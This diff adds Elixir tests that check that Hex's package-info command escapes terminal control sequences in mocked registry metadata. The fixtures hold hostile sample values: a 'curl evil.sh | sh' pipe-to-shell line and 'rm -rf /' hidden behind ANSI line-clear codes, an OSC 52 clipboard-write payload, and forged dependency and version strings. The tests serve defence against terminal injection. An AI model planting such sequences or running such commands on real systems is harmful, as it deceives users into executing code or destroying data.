@@ -175,6 +175,74 @@ defmodule Mix.Tasks.Hex.InfoTest do
     assert_received {:mix_shell, :info, ["Downloads: 26 208"]}
   end
 
+  test "escapes terminal control sequences in package information" do
+    bypass = Bypass.open()
+    Hex.State.put(:api_url, "http://localhost:#{bypass.port}/api")
+
+    package_body = %{
+      "name" => "ex_doc",
+      "meta" => %{
+        "description" => "Docs\e[2K\rActually run: curl evil.sh | sh",
+        "licenses" => ["MIT\e[31m"],
+        "links" => %{"repo\e[1m" => "https://example.com/\e[2Kforged"}
+      },
+      "configs" => %{"mix.exs" => "{:ex_doc, \"~> 1.0\"}\e[2K\r{:evil, \"~> 1.0\"}"},
+      "releases" => [],
+      "retirements" => %{},
+      "downloads" => %{}
+    }
+
+    Bypass.expect(bypass, "GET", "/api/packages/ex_doc", fn conn ->
+      conn
+      |> Plug.Conn.put_resp_header("content-type", "application/vnd.hex+erlang")
+      |> Plug.Conn.resp(200, Hex.Utils.safe_serialize_erlang(package_body))
+    end)
+
+    Mix.Tasks.Hex.Info.run(["ex_doc"])
+
+    assert_received {:mix_shell, :info, ["Docs\\e[2K\\rActually run: curl evil.sh | sh\n"]}
+
+    assert_received {:mix_shell, :info,
+                     ["Config: {:ex_doc, \"~> 1.0\"}\\e[2K\\r{:evil, \"~> 1.0\"}"]}
+
+    assert_received {:mix_shell, :info, ["Licenses: MIT\\e[31m"]}
+
+    # The link value is a URL, so the control bytes are dropped rather than shown.
+    assert_received {:mix_shell, :info, ["  repo\\e[1m: https://example.com/[2Kforged"]}
+  end
+
+  test "escapes terminal control sequences in release information" do
+    bypass = Bypass.open()
+    Hex.State.put(:api_url, "http://localhost:#{bypass.port}/api")
+
+    release_body = %{
+      "version" => "0.1.0",
+      "inserted_at" => "#{Date.utc_today()}T12:00:00Z",
+      "retirement" => %{"reason" => "security", "message" => "Use 2.0\e[2K\rrm -rf /"},
+      "publisher" => %{"username" => "eve\e[31m", "email" => "eve\e[1m@example.com"},
+      "configs" => %{"mix.exs" => "{:ex_doc, \"~> 0.1.0\"}"},
+      "requirements" => %{
+        "postgrex" => %{"requirement" => "~> 0.2\e[2K\rmalicious", "optional" => false}
+      }
+    }
+
+    Bypass.expect(bypass, "GET", "/api/packages/ex_doc/releases/0.1.0", fn conn ->
+      conn
+      |> Plug.Conn.put_resp_header("content-type", "application/vnd.hex+erlang")
+      |> Plug.Conn.resp(200, Hex.Utils.safe_serialize_erlang(release_body))
+    end)
+
+    Mix.Tasks.Hex.Info.run(["ex_doc", "0.1.0"])
+
+    assert_received {:mix_shell, :info, [retirement]}
+    assert retirement =~ "(security) Use 2.0\\e[2K\\rrm -rf /"
+    refute retirement =~ "\r"
+
+    assert_received {:mix_shell, :info, ["  postgrex ~> 0.2\\e[2K\\rmalicious"]}
+
+    assert_received {:mix_shell, :info, ["Published by: eve\\e[31m (eve\\e[1m@example.com)"]}
+  end
+
   test "prints publisher info for releases" do
     Mix.Tasks.Hex.Info.run(["ex_doc", "0.0.1"])
     assert_received {:mix_shell, :info, ["Published by: user (user@mail.com)"]}
@@ -184,5 +252,87 @@ defmodule Mix.Tasks.Hex.InfoTest do
     Mix.Tasks.Hex.Info.run(["ex_doc", "0.0.1"])
     assert_received {:mix_shell, :info, ["Released: " <> date]}
     assert date == "#{Date.utc_today()}"
+  end
+
+  test "escapes recent release versions and preserves retirement markers" do
+    bypass = Bypass.open()
+    Hex.State.put(:api_url, "http://localhost:#{bypass.port}/api")
+
+    body = %{
+      "meta" => %{"description" => "description"},
+      "configs" => %{"mix.exs" => "{:evil, \"~> 1.0\"}"},
+      "releases" => [
+        %{"version" => "1.0.0\e[2K\rFORGED"},
+        %{"version" => "0.9.0\e]52;c;cGF5bG9hZA==\a"}
+      ],
+      "retirements" => %{"0.9.0\e]52;c;cGF5bG9hZA==\a" => %{}}
+    }
+
+    Bypass.expect(bypass, "GET", "/api/packages/evil", fn conn ->
+      conn
+      |> Plug.Conn.put_resp_header("content-type", "application/vnd.hex+erlang")
+      |> Plug.Conn.resp(200, Hex.Utils.safe_serialize_erlang(body))
+    end)
+
+    Mix.Tasks.Hex.Info.run(["evil"])
+    output = Case.shell_output()
+    assert output =~ "1.0.0\\e[2K\\rFORGED\n"
+    assert output =~ "0.9.0\\e]52;c;cGF5bG9hZA==\\a (retired)\n"
+    refute output =~ "\e"
+    refute output =~ "\r"
+    refute output =~ "\a"
+  end
+
+  test "escapes dependency names in release information" do
+    bypass = Bypass.open()
+    Hex.State.put(:api_url, "http://localhost:#{bypass.port}/api")
+
+    body = %{
+      "version" => "1.0.0",
+      "retirement" => nil,
+      "configs" => %{"mix.exs" => "{:evil, \"~> 1.0\"}"},
+      "requirements" => %{
+        "dep\e[2K\rFORGED" => %{"app" => "dep\e[2K\rFORGED", "requirement" => "~> 1.0"}
+      }
+    }
+
+    Bypass.expect(bypass, "GET", "/api/packages/evil/releases/1.0.0", fn conn ->
+      conn
+      |> Plug.Conn.put_resp_header("content-type", "application/vnd.hex+erlang")
+      |> Plug.Conn.resp(200, Hex.Utils.safe_serialize_erlang(body))
+    end)
+
+    Mix.Tasks.Hex.Info.run(["evil", "1.0.0"])
+    assert_received {:mix_shell, :info, ["  dep\\e[2K\\rFORGED ~> 1.0"]}
+    output = Case.shell_output()
+    refute output =~ "\e"
+    refute output =~ "\r"
+  end
+
+  test "removes terminal controls from release documentation URLs" do
+    bypass = Bypass.open()
+    Hex.State.put(:api_url, "http://localhost:#{bypass.port}/api")
+
+    body = %{
+      "version" => "1.0.0\e[2K\rFORGED",
+      "retirement" => nil,
+      "configs" => %{"mix.exs" => "{:evil, \"~> 1.0\"}"},
+      "has_docs" => true
+    }
+
+    Bypass.expect(bypass, "GET", "/api/packages/evil/releases/1.0.0", fn conn ->
+      conn
+      |> Plug.Conn.put_resp_header("content-type", "application/vnd.hex+erlang")
+      |> Plug.Conn.resp(200, Hex.Utils.safe_serialize_erlang(body))
+    end)
+
+    Mix.Tasks.Hex.Info.run(["evil", "1.0.0"])
+
+    assert_received {:mix_shell, :info,
+                     ["Documentation at: https://evil.hexdocs.pm/1.0.0[2KFORGED"]}
+
+    output = Case.shell_output()
+    refute output =~ "\e"
+    refute output =~ "\r"
   end
 end
